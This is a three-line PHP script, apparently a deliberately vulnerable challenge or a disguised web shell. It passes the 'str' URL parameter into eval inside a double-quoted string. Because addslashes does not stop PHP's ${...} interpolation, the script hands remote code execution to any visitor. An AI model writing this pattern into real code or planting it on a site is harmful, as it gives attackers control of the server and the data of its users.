<?php 
$str=@(string)$_GET['str'];
eval('$str="'.addslashes($str).'";');